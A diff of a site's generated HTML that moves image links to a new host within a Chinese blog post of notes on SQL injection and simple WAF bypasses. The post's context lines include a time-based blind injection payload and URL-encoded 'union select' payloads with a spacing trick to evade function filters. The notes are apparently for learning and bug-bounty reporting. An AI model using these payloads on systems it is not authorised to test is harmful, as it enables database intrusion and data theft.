+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31_hufff1d550fde8e63a64415b552051285b_34654_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31_hufff1d550fde8e63a64415b552051285b_34654_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1634,10 +1634,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;每个字符可能是a-z&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33.png&#34;
 	width=&#34;1138&#34;
 	height=&#34;477&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33_hud2246acf058c6338a36f9840308d345f_38212_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33_hud2246acf058c6338a36f9840308d345f_38212_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33_hud2246acf058c6338a36f9840308d345f_38212_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33_hud2246acf058c6338a36f9840308d345f_38212_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1647,10 +1647,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Start Attack!&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39.jpg&#34;
 	width=&#34;120&#34;
 	height=&#34;104&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39_hu76cdffda0857d6e642563bf1c5bcd23d_2924_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39_hu76cdffda0857d6e642563bf1c5bcd23d_2924_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39_hu76cdffda0857d6e642563bf1c5bcd23d_2924_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39_hu76cdffda0857d6e642563bf1c5bcd23d_2924_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;斯哈斯哈&#34;
@@ -1663,10 +1663,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;最后将成功的筛选出来并进行排序&lt;/p&gt;
 &lt;p&gt;美滋滋，数据跃然窗口上(什&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38.png&#34;
 	width=&#34;840&#34;
 	height=&#34;609&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38_hu0ecf31f4655d2d94ba3e519438f96c56_66061_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38_hu0ecf31f4655d2d94ba3e519438f96c56_66061_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38_hu0ecf31f4655d2d94ba3e519438f96c56_66061_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38_hu0ecf31f4655d2d94ba3e519438f96c56_66061_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;事admin!&#34;
@@ -1711,10 +1711,10 @@
 &lt;p&gt;举一个时间型盲注的&lt;del&gt;糖炒栗子&lt;/del&gt;例子&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and if(length(database())&amp;gt;1,sleep(5),1)--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;大意就是:如果数据库名字长度大于1，就延迟5秒，否则if语句返回1(也就是不延迟)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25.png&#34;
 	width=&#34;1160&#34;
 	height=&#34;578&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25_hu90eaab0fb56ef4d7a9574920cf7d64d0_133378_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25_hu90eaab0fb56ef4d7a9574920cf7d64d0_133378_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25_hu90eaab0fb56ef4d7a9574920cf7d64d0_133378_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25_hu90eaab0fb56ef4d7a9574920cf7d64d0_133378_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;延迟了喵!&#34;
@@ -1733,10 +1733,10 @@
 &lt;h3 id=&#34;交srcの小技巧&#34;&gt;交SRCの小技巧&lt;/h3&gt;
 &lt;p&gt;除了跑SQLmap之外，还有一个非常直接证明SQL注入的好方法&lt;/p&gt;
 &lt;p&gt;就是用一个时间盲注payload放进burp的repeater,然后趁延迟的时候截图&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32.png&#34;
 	width=&#34;1164&#34;
 	height=&#34;547&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32_hu7fae41692b7d587401a9736f88571a76_65306_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32_hu7fae41692b7d587401a9736f88571a76_65306_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32_hu7fae41692b7d587401a9736f88571a76_65306_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32_hu7fae41692b7d587401a9736f88571a76_65306_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;你看它没出来，肯定有问题啊= =&#34;
@@ -1748,10 +1748,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;就可以轻松证明存在SQL注入&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44.jpg&#34;
 	width=&#34;1772&#34;
 	height=&#34;1391&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44_hu85a3b2b9bdd12e77a0df4ce838f095d0_213626_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44_hu85a3b2b9bdd12e77a0df4ce838f095d0_213626_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44_hu85a3b2b9bdd12e77a0df4ce838f095d0_213626_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44_hu85a3b2b9bdd12e77a0df4ce838f095d0_213626_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1799,10 +1799,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;...
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;id=-1&amp;#39;+%75%6e%69%6f%6e%20%73%65%6c%65%63%74+1,2%23&amp;amp;Submit=Submit
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1.jpg&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1.jpg&#34;
 	width=&#34;1917&#34;
 	height=&#34;858&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1_hue9593e422fd1379af5d21c3d90fc1e16_108518_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1_hue9593e422fd1379af5d21c3d90fc1e16_108518_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1_hue9593e422fd1379af5d21c3d90fc1e16_108518_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1_hue9593e422fd1379af5d21c3d90fc1e16_108518_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;就这样坏喵喵绕过了汪汪队&#34;
@@ -1818,10 +1818,10 @@
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;检测databaseuser等函数&#34;&gt;检测database(),user()等函数&lt;/h3&gt;
 &lt;p&gt;之前的POST+URL编码居然废了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2.jpg&#34;
 	width=&#34;200&#34;
 	height=&#34;230&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2_hu5fad17c973d9da7d1043e095b3218feb_8375_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2_hu5fad17c973d9da7d1043e095b3218feb_8375_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2_hu5fad17c973d9da7d1043e095b3218feb_8375_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2_hu5fad17c973d9da7d1043e095b3218feb_8375_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;啊啊啊啊啊！！！喵能狂怒&#34;
@@ -1841,10 +1841,10 @@
 &lt;p&gt;莫名想到课上讲过concat()字符拼接&lt;/p&gt;
 &lt;p&gt;但终究它还是&lt;b&gt;&lt;font size=&#34;4&#34;&gt;拼成了字符!!!&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
 &lt;p&gt;逝世了，因为他是字符，起不到函数的作用了=   =&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3.jpg&#34;
 	width=&#34;1916&#34;
 	height=&#34;856&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3_hu0e04cd88027132776cc0a6c1eb77a561_109337_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3_hu0e04cd88027132776cc0a6c1eb77a561_109337_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3_hu0e04cd88027132776cc0a6c1eb77a561_109337_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3_hu0e04cd88027132776cc0a6c1eb77a561_109337_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;寄寄子来喽&#34;
@@ -1857,10 +1857,10 @@
 &gt;&lt;/p&gt;
 &lt;h4 id=&#34;利用函数名feature进行拼接&#34;&gt;利用函数名&amp;quot;feature&amp;quot;进行拼接&lt;/h4&gt;
 &lt;p&gt;在无意中发现&lt;code&gt;database()&lt;/code&gt;和&lt;code&gt;database ()&lt;/code&gt;都是可以执行的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5.jpg&#34;
 	width=&#34;1265&#34;
 	height=&#34;584&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5_huc78525c57ee757d603e2674b2c4884df_71236_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5_huc78525c57ee757d603e2674b2c4884df_71236_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5_huc78525c57ee757d603e2674b2c4884df_71236_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5_huc78525c57ee757d603e2674b2c4884df_71236_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1880,10 +1880,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;...
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;id=-1&amp;#39;+%75%6e%69%6f%6e%20%73%65%6c%65%63%74+1,database+()%23&amp;amp;Submit=Submit
